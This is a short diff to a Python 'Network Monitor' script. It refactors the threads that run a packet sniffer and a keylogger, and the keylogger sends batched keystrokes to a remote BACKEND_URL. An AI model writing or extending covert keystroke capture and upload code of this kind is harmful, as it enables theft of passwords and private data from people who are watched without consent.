@@ -30,6 +30,10 @@ def keystrokes_thread_callback():
     send_batched_keystrokes(BACKEND_URL)
 
 
+def sniffer_thread_callback():
+    sniff(prn=handle_sniffed_packets)
+
+
 def on_exit():
     print("Disconnecting from server...")
 
@@ -125,15 +129,15 @@ if __name__ == "__main__":
 
     print("Starting Network Monitor...")
     # Start various threads
-    sniffingThread = Thread(target=packets_thread_callback, daemon=True)
-    loggerThread = Thread(target=keystrokes_thread_callback, daemon=True)
+    packets_thread = Thread(target=packets_thread_callback, daemon=True)
+    sniffer_thread = Thread(target=sniffer_thread_callback, daemon=True)
+    logger_thread = Thread(target=keystrokes_thread_callback, daemon=True)
 
     print("Starting Sniffer Thread")
-    sniffingThread.start()
+    packets_thread.start()
+    sniffer_thread.start()
     print("Starting Key Logger Thread")
-    loggerThread.start()
-    sniff(prn=handle_sniffed_packets)
-
+    logger_thread.start()
     with keyboard.Listener(
         on_press=handle_key_press, on_release=handle_key_release
     ) as key_recorder:
